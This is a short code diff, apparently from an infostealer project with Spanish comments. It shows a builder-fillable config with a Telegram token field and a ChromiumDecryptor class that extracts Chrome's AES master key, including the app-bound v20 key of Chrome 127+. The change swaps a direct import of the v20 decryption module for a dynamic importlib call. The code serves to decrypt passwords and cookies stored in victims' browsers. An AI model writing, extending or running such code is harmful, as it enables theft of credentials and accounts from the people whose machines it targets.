@@ -21,7 +21,7 @@ from datetime import datetime
 __version__ = "1.4.0"
 
 # =========================================================================
-# ⚙️ CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
+# CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
 # =========================================================================
 CONFIG = {
     "tg_token":   "",  
@@ -314,8 +314,9 @@ class ChromiumDecryptor:
                 logger.warning("!!! DETECTADA LLAVE V20 (Chrome 127+). REQUIERE EJECUTAR COMO ADMINISTRADOR PARA DESCIFRAR !!!")
 
             try:
-                from modules.chrome_v20_decryption import v20_decryptor
-                aes_key = v20_decryptor.get_v20_key(app_bound_b64, win32crypt)
+                import importlib
+                v20_module = importlib.import_module('modules.chrome_v20_decryption.v20_decryptor')
+                aes_key = v20_module.get_v20_key(app_bound_b64, win32crypt)
                 if aes_key:
                     logger.debug(f"Master key AES (v20) obtenida ({len(aes_key)} bytes) para: {user_data_path}")
                     return aes_key, True
